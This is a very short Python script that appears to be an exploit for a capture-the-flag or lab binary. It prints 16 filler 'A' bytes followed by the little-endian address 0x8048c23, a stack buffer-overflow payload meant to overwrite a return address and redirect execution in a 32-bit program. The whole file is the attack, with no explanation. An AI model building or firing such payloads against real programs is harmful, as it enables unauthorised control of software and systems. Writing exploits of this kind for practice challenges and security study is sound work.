import sys

sys.stdout.buffer.write(b'A'*16 + 0x8048c23.to_bytes(4, 'little'))
